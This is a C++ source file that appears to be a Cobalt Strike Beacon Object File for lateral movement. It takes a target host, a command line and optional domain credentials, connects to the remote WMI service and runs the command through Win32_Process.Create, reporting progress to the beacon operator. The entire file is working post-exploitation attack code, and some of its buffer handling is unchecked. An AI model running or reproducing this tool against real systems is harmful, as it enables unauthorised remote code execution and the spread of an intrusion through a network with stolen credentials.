#include <general.h>

auto CreateCreds(
    COAUTHINFO*&      AuthInfo,
    COAUTHIDENTITY*&  AuthIdentity,
    WCHAR*            User,
    WCHAR*            Password,
    WCHAR*            Domain,
    INT32             IsCurrent
) -> VOID {
    AuthIdentity = nullptr;
    AuthInfo     = nullptr;

    if ( IsCurrent == 0 ) {
        AuthIdentity = (COAUTHIDENTITY*)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( COAUTHIDENTITY ) );
        if ( !AuthIdentity ) return;

        if ( User && *User ) {
            AuthIdentity->User = (USHORT*)User;
            AuthIdentity->UserLength = (ULONG)wcslen( User );
        }

        if ( Password && *Password ) {
            AuthIdentity->Password = (USHORT*)Password;
            AuthIdentity->PasswordLength = (ULONG)wcslen( Password );
        }

        if ( Domain && *Domain ) {
            AuthIdentity->Domain = (USHORT*)Domain;
            AuthIdentity->DomainLength = (ULONG)wcslen( Domain );
        }

        AuthIdentity->Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

        AuthInfo = (COAUTHINFO*)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( COAUTHINFO ) );
        if ( !AuthInfo ) {
            HeapFree( GetProcessHeap(), 0, AuthIdentity );
            AuthIdentity = nullptr;
            return;
        }

        AuthInfo->dwAuthnSvc = RPC_C_AUTHN_WINNT;
        AuthInfo->dwAuthzSvc = RPC_C_AUTHZ_NONE;
        AuthInfo->dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
        AuthInfo->dwCapabilities = EOAC_NONE;
        AuthInfo->pwszServerPrincName = nullptr;
        AuthInfo->dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
        AuthInfo->pAuthIdentityData = AuthIdentity;
    }
}

EXTERN_C
void go(CHAR* buff, INT32 len) {
    datap Parser = { 0 };

    WCHAR* Target    = nullptr;
    WCHAR* Domain    = nullptr;
    WCHAR* CmdLine   = nullptr;
    WCHAR* Username  = nullptr;
    WCHAR* Password  = nullptr;
    INT32  IsCurrent = 0;
    
    BeaconDataParse(&Parser, buff, len);
    
    Target    = (WCHAR*)BeaconDataExtract(&Parser, nullptr);
    CmdLine   = (WCHAR*)BeaconDataExtract(&Parser, nullptr);
    IsCurrent = BeaconDataInt(&Parser);
    Domain    = (WCHAR*)BeaconDataExtract(&Parser, nullptr);
    Username  = (WCHAR*)BeaconDataExtract(&Parser, nullptr);
    Password  = (WCHAR*)BeaconDataExtract(&Parser, nullptr);

    // Build proper namespace
    WCHAR wmiNamespace[256] = {0};
    wcscpy(wmiNamespace, L"\\\\");
    wcscat(wmiNamespace, Target);
    wcscat(wmiNamespace, L"\\root\\cimv2");

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Connecting to: %ls", wmiNamespace);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Command: %ls", CmdLine);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Using credentials: %s", IsCurrent ? "current" : "provided");

    HRESULT hr = S_OK;
    IWbemLocator* pLoc = nullptr;
    IWbemServices* pSvc = nullptr;
    IWbemClassObject* pClass = nullptr;
    IWbemClassObject* pInParamsDefinition = nullptr;
    IWbemClassObject* pInParams = nullptr;
    IWbemClassObject* pOutParams = nullptr;
    
    BSTR bstrNamespace = nullptr;
    BSTR bstrUser = nullptr;
    BSTR bstrPassword = nullptr;
    BSTR bstrDomain = nullptr;
    BSTR bstrClass = nullptr;
    BSTR bstrMethod = nullptr;

    // Define CLSID and IID
    CLSID CLSID_WbemLocator = {0x4590F811, 0x1D3A, 0x11D0, {0x89, 0x1F, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24}};
    IID IID_IWbemLocator = {0xDC12A687, 0x737F, 0x11CF, {0x88, 0x4D, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24}};

    // Initialize COM
    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx failed: 0x%08lx", hr);
        return;
    }

    // Initialize COM security
    hr = CoInitializeSecurity(
        NULL, -1, NULL, NULL, 
        RPC_C_AUTHN_LEVEL_DEFAULT, 
        RPC_C_IMP_LEVEL_IMPERSONATE, 
        NULL, EOAC_NONE, NULL
    );

    // Create WMI locator
    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, 
                               IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "CoCreateInstance failed: 0x%08lx", hr);
        goto cleanup;
    }

    // Prepare credentials
    bstrNamespace = SysAllocString(wmiNamespace);
    
    if (!IsCurrent && Username && *Username) {
        // Build domain\username format if domain is provided
        if (Domain && *Domain) {
            WCHAR fullUser[256] = {0};
            wcscpy(fullUser, Domain);
            wcscat(fullUser, L"\\");
            wcscat(fullUser, Username);
            bstrUser = SysAllocString(fullUser);
        } else {
            bstrUser = SysAllocString(Username);
        }
        bstrPassword = SysAllocString(Password);
    }
    
    // Connect to WMI
    hr = pLoc->ConnectServer(bstrNamespace, bstrUser, bstrPassword,
                            NULL, 0, NULL, NULL, &pSvc);
    
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "ConnectServer failed: 0x%08lx", hr);
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully connected to WMI");

    // Set security levels - use higher authentication level
    hr = CoSetProxyBlanket(
        pSvc, 
        RPC_C_AUTHN_WINNT, 
        RPC_C_AUTHZ_NONE, 
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,  // Higher security level
        RPC_C_IMP_LEVEL_IMPERSONATE, 
        NULL, 
        EOAC_NONE
    );
    
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "CoSetProxyBlanket failed: 0x%08lx", hr);
        goto cleanup;
    }

    // Try multiple WMI classes/methods
    bstrClass = SysAllocString(L"Win32_Process");
    bstrMethod = SysAllocString(L"Create");
    
    hr = pSvc->GetObject(bstrClass, 0, NULL, &pClass, NULL);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "GetObject failed: 0x%08lx - Trying alternative approach", hr);
        
        // Try CIM_Process as alternative
        if (bstrClass) SysFreeString(bstrClass);
        bstrClass = SysAllocString(L"CIM_Process");
        
        hr = pSvc->GetObject(bstrClass, 0, NULL, &pClass, NULL);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "Alternative GetObject also failed: 0x%08lx", hr);
            goto cleanup;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully accessed WMI class");

    hr = pClass->GetMethod(bstrMethod, 0, &pInParamsDefinition, NULL);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "GetMethod failed: 0x%08lx", hr);
        goto cleanup;
    }

    hr = pInParamsDefinition->SpawnInstance(0, &pInParams);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "SpawnInstance failed: 0x%08lx", hr);
        goto cleanup;
    }

    // Set command line parameter
    VARIANT varCommand;
    VariantInit(&varCommand);
    varCommand.vt = VT_BSTR;
    varCommand.bstrVal = SysAllocString(CmdLine);
    
    hr = pInParams->Put(L"CommandLine", 0, &varCommand, 0);
    VariantClear(&varCommand);
    
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Put failed: 0x%08lx", hr);
        goto cleanup;
    }

    // Execute method
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Executing remote process...");
    hr = pSvc->ExecMethod(bstrClass, bstrMethod, 0, NULL, pInParams, &pOutParams, NULL);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "ExecMethod failed: 0x%08lx", hr);
        goto cleanup;
    }

    // Get results
    if (pOutParams) {
        VARIANT varReturnValue;
        VariantInit(&varReturnValue);
        hr = pOutParams->Get(L"ReturnValue", 0, &varReturnValue, NULL, 0);
        if (SUCCEEDED(hr)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Process creation returned: %d", varReturnValue.intVal);
            if (varReturnValue.intVal == 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Success! Process started with PID");
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[-] Process creation failed with code: %d", varReturnValue.intVal);
            }
            VariantClear(&varReturnValue);
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Process executed (no output parameters returned)");
    }

cleanup:
    // Cleanup
    if (bstrNamespace) SysFreeString(bstrNamespace);
    if (bstrUser) SysFreeString(bstrUser);
    if (bstrPassword) SysFreeString(bstrPassword);
    if (bstrDomain) SysFreeString(bstrDomain);
    if (bstrClass) SysFreeString(bstrClass);
    if (bstrMethod) SysFreeString(bstrMethod);
    
    if (pOutParams) pOutParams->Release();
    if (pInParams) pInParams->Release();
    if (pInParamsDefinition) pInParamsDefinition->Release();
    if (pClass) pClass->Release();
    if (pSvc) pSvc->Release();
    if (pLoc) pLoc->Release();
    
    CoUninitialize();
}